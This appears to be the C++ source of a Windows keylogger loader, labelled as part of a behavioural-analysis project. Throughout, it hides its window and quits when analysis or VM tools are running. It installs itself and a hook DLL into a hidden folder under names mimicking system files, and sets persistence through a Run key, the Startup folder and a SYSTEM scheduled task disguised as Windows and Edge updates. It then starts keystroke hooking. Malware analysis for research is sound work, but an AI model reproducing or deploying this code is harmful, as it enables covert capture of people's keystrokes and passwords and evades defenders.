/*
 * keylogger_loader.cpp
 * FMA Project - Behavioural Analysis of a Keylogger
 * 
 * Main loader executable. Installs the keylogger to a hidden location,
 * sets up persistence (Registry + Startup Folder + Scheduled Task),
 * and loads the hook DLL.
 *
 * Compile (from Kali):
 *   x86_64-w64-mingw32-g++-posix -o build/keylogger_loader.exe src/keylogger_loader.cpp \
 *     -luser32 -lshell32 -mwindows -static-libgcc -static-libstdc++ -Os -s
 */
#include <windows.h>
#include <tlhelp32.h>  // For CreateToolhelp32Snapshot, PROCESSENTRY32W
#include <shlobj.h>    // For SHGetFolderPathA, CSIDL_APPDATA, CSIDL_STARTUP
#include <string>
#include <fstream>
// ... other includes you already have

#include <cstring>
#include <cstdlib>
#include <ctime>

// ========== EVASION: Anti-analysis before execution ==========
bool detect_analysis_tools() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    
    const char* blacklist[] = {
        "procmon", "procexp", "processhacker", "wireshark",
        "dumpcap", "ida", "ollydbg", "x64dbg", "windbg",
        "immunity", "vmtoolsd", "vboxservice", "vboxtray"
    };
    
    PROCESSENTRY32W pe = {0};
    pe.dwSize = sizeof(pe);
    
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char exeLower[MAX_PATH];
            int i = 0;
            while (pe.szExeFile[i] && i < MAX_PATH-1) {
                exeLower[i] = (char)tolower(pe.szExeFile[i]);
                i++;
            }
            exeLower[i] = 0;
            
            for (const char* b : blacklist) {
                if (strstr(exeLower, b)) {
                    CloseHandle(hSnap);
                    return true;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return false;
}

// ========== HIDE CONSOLE WINDOW ==========
void hide_console() {
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) {
        ShowWindow(consoleWnd, SW_HIDE);
    }
}

// ========== PERSISTENCE: Registry Run Key ==========
bool registry_persistence(const std::string& payloadPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey
    );
    
    if (result != ERROR_SUCCESS) return false;
    
    // Benign-looking value name
    result = RegSetValueExA(
        hKey, "WindowsUpdateHelper", 0, REG_SZ,
        (const BYTE*)payloadPath.c_str(),
        payloadPath.length() + 1
    );
    
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// ========== PERSISTENCE: Startup Folder ==========
bool startup_persistence(const std::string& payloadPath) {
    char startupPath[MAX_PATH];
    HRESULT hr = SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    if (FAILED(hr)) return false;
    
    std::string linkPath = std::string(startupPath) + "\\WindowsExplorer.lnk";
    
    if (CopyFileA(payloadPath.c_str(), linkPath.c_str(), FALSE)) {
        SetFileAttributesA(linkPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
        return true;
    }
    return false;
}

// ========== PERSISTENCE: Scheduled Task ==========
bool task_persistence(const std::string& payloadPath) {
    std::string cmd = "schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \"";
    cmd += payloadPath;
    cmd += "\" /sc ONLOGON /ru \"SYSTEM\" /F";
    
    // Use WinExec for silent execution
    WinExec(cmd.c_str(), SW_HIDE);
    return true;
}

// ========== INSTALL: Copy to hidden location ==========
std::string install_hidden() {
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    // Create hidden directory structure
    std::string hiddenDir = std::string(appData) + "\\Microsoft\\Windows\\TaskBars";
    CreateDirectoryA(hiddenDir.c_str(), NULL);
    SetFileAttributesA(hiddenDir.c_str(), 
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // Get current executable path
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    
    // Copy ourselves with benign name
    std::string destExe = hiddenDir + "\\sihost.exe";
    CopyFileA(currentExe, destExe.c_str(), FALSE);
    
    // Copy the DLL alongside
    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    std::string srcDll = std::string(currentDir) + "\\keylogger_dll.dll";
    std::string destDll = hiddenDir + "\\sihost.dll";
    CopyFileA(srcDll.c_str(), destDll.c_str(), FALSE);
    
    // Hide all files
    SetFileAttributesA(destExe.c_str(), 
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    SetFileAttributesA(destDll.c_str(), 
                       FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return destExe;
}

// ========== MAIN ==========
int main() {
    // Step 1: Hide console immediately
    hide_console();
    
    // Step 2: Check for analysis tools (evasion)
    if (detect_analysis_tools()) {
        // Wait and retry once
        Sleep(120000); // 2 minutes
        if (detect_analysis_tools()) {
            return 0; // Give up - being analyzed
        }
    }
    
    // Step 3: Evasion - random startup delay (30-90 seconds)
    srand(GetTickCount());
    int delay = (rand() % 60000) + 30000;
    Sleep(delay);
    
    // Step 4: Install to hidden location
    std::string installedPath = install_hidden();
    
    // Step 5: Set up persistence (multiple methods)
    registry_persistence(installedPath);
    startup_persistence(installedPath);
    task_persistence(installedPath);
    
    // Step 6: Load and execute the hook DLL
    // (The installer itself becomes the long-running process)
    HMODULE hDll = LoadLibraryA("sihost.dll");
    if (!hDll) {
        // Fallback search
        hDll = LoadLibraryA("keylogger_dll.dll");
        if (!hDll) return 1;
    }
    
    typedef void (*StartHookProc)();
    StartHookProc startHook = (StartHookProc)GetProcAddress(hDll, "StartHook");
    
    if (startHook) {
        startHook(); // This blocks (message loop inside)
    }
    
    FreeLibrary(hDll);
    return 0;
}
